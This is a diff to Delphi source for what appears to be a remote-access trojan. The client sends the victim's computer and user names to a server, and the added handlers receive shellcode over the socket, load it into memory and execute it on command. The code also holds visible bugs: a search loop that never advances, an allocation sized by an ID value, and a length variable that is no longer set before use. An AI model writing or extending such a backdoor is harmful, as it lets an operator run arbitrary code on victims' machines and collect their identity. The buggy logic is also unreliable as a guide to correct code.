@@ -9,33 +9,11 @@ uses
 
 const
   CMD_ONLINE = 0;
+  CMD_SHELLCODE_QUESTION = 1;
+  CMD_SHELLCODE_NEW = 2;
+  CMD_SHELLCODE_ADD = 3;
+  CMD_SHELLCODE_CALL = 4;
 
-type
-  TConnRec = packed record
-    pAPI:PAPIRec;
-    hWinsock:Integer;
-    xWSAStartup:function(wVersionRequired: word; var WSData: TWSAData): Integer; stdcall;
-    xsocket:function(af, Struct, protocol: Integer): TSocket; stdcall;
-    xhtons:function(hostshort: u_short): u_short; stdcall;
-    xinet_addr:function(cp: PChar): u_long; stdcall;
-    xgethostbyname:function(name: PChar): PHostEnt; stdcall;
-    xconnect:function(s: Integer; var name: TSockAddr; namelen: Integer): Integer; stdcall;
-    xsend:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
-    xrecv:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
-    xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
-    xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
-  end;
-  PConnRec = ^TConnRec;
-
-type
-  LPSocketHeader = ^TSocketHeader;
-  TSocketHeader = packed Record
-    bCommand: Byte;
-    dwStreamID: DWORD;
-    dwPacketLen: DWORD;
-    dwDecompressedLen: DWORD;
-    dwTotalLen: DWORD;
-  end;
 
 procedure ConnectionLoop(pAPI:PAPIRec);
 procedure ConnectionLoop_CALLER(pAPI:PAPIRec); stdcall;
@@ -63,7 +41,7 @@ begin
   end;
   with LPSocketHeader(@szSendBuffer)^ do
   begin
-    dwPacketLen := iBufferLen + 1;
+    dwPacketLen := iBufferLen;
     bCommand := bySocketCmd;
   end;
   Dec(DWORD(lpszSendBuffer));
@@ -90,10 +68,79 @@ begin
   end;
 end;
 
+function SearchShellCode(pConn:PConnRec; dwID:Cardinal):PShellCodeRec;
+var
+  pLoop:PShellCodeRec;
+begin
+  Result := nil;
+  pLoop := pConn.pShellCode;
+  if pLoop = nil then
+    exit;
+  repeat
+    if pLoop.dwID = dwID then
+    begin
+      Result := pLoop;
+      break;
+    end;
+  until pLoop.nextShellCode = nil;
+end;
+
+procedure CallShellCode(pConn:PConnRec; pShell:PShellCode);
+var
+  pCallShell:PShellCodeRec;
+  pCall:procedure(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);
+begin
+  pCallShell := SearchShellCode(pConn, pShell.dwID);
+  if pCallShell <> nil then
+  begin
+    pCall := pCallShell.pShellCode;
+    pCall(pConn, @(pShell.pData), pShell.dwLen);
+  end;
+end;
+
+procedure AddShellCode(pConn:PConnRec; pShell:PShellCode; pData:Pointer);
+var
+  pNewShell:PShellCodeRec;
+  pLoop:PShellCodeRec;
+begin
+  pNewShell := pConn.pAPI.xAllocMem(pConn.pAPI, pShell.dwLen);
+  pNewShell.dwLen := pShell.dwLen;
+  pNewShell.dwID := pShell.dwID;
+  pNewShell.pReserved := nil;
+  pNewShell.nextShellCode := nil;
+  pNewShell.pShellCode := pConn.pAPI.xAllocMem(pConn.pAPI, pNewShell.dwID);
+  if pNewShell.pShellCode <> nil then
+    CopyMemory(pNewShell.pShellCode, pData, pNewShell.dwLen);
+  pNewShell.nextShellCode := pConn.pShellCode;
+
+  pConn.pShellCode := pNewShell;
+end;
+
+function ParseShellCode(pConn:PConnRec; pData:Pointer; dwLen:Cardinal):PShellCode;
+var
+  pShell:PShellCode;
+begin
+  Result := pData;
+  Result.pData := Pointer(DWORD(pData) + SizeOf(TShellCode) - SizeOf(Pointer));
+end;
+
+
 procedure ParsePacket(pConn:PConnRec; pBuffer:Pointer; dwLen:Cardinal; bCommand:Byte);
+var
+  pShell:PShellCode;
 begin
   case bCommand of
-    0: pConn.pAPI.xMessageBoxW(0, pBuffer, nil, 0);
+    CMD_ONLINE: pConn.pAPI.xMessageBoxW(0, pBuffer,nil,0);
+    CMD_SHELLCODE_NEW: 
+      begin
+        pShell := pBuffer;
+        AddShellCode(pConn, pShell, @(pShell.pData));
+      end;
+    CMD_SHELLCODE_CALL: 
+      begin
+        pShell := pBuffer;
+        CallShellCode(pConn, pShell);
+      end;
   end;
 end;
 
@@ -103,32 +150,27 @@ var
   dwBufferLen: DWORD;
   bCommand:Byte;
   mRecvBuffer:Pointer;
+  pPacketHeader:TSocketHeader;
 begin
   mRecvBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
   if (mRecvBuffer <> nil) then
   begin
     while True do
     begin
-      iResult := RecvBuffer(pConn, @dwBufferLen, SizeOf(DWORD));
+      iResult := RecvBuffer(pConn, @pPacketHeader, SizeOf(pPacketHeader));
       if (iResult = 0) or (iResult = SOCKET_ERROR) then
         Break;
-      if (dwBufferLen > 8192) then
+      if (pPacketHeader.dwPacketLen > 8192) then
         Break;
-      // Get Command
-      iResult := RecvBuffer(pConn, @bCommand, 1);
-      if (iResult = 0) or (iResult = SOCKET_ERROR) then
-      begin
-        Break;
-      end;
       //Get Data
       pConn.pAPI.xZeroMemory(mRecvBuffer^, 8192);
-      iResult := RecvBuffer(pConn, mRecvBuffer, dwBufferLen - 1);
+      iResult := RecvBuffer(pConn, mRecvBuffer, pPacketHeader.dwPacketLen);
       if (iResult = 0) or (iResult = SOCKET_ERROR) then
       begin
         Break;
       end;
       //Parse Packet
-      ParsePacket(pConn, mRecvBuffer, dwBufferLen - 1, bCommand);
+      ParsePacket(pConn, mRecvBuffer, dwBufferLen - 1, pPacketHeader.bCommand);
     end;
     pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
   end;
@@ -155,7 +197,7 @@ begin
   if pFullInformations <> nil then
   begin
     pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100);
-    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, (pConn.pAPI.xlstrlenW(pFullInformations) + 1) * 2, False);
+    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, pConn.pAPI.xlstrlenW(pFullInformations) * 2, False);
   end;
   pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
 end;
